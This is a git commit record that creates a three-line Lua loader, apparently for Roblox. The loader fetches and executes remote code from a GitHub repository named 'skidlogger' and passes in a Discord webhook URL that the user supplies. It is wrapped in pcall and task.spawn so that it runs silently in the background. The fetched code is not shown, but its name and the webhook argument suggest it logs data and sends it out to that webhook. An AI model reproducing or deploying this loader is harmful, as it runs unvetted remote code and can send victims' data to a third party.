754dae0cbbd418323607cf6e49710e275ea8561f
IvanTheScript <122665922+IvanTheProtogen@users.noreply.github.com>
2024-09-22 08:48:43 +0300

    Create loader.lua

---
+++ loader.lua
@@ -0,0 +1,3 @@
+-- Replace the `<<URL>>` with your own discord webhook API URL.
+
+pcall(function()task.spawn(function()loadstring(game:HttpGet("http://github.com/IvanTheProtogen/skidlogger/raw/main/main.lua"))()("<<URL>>")end)end);
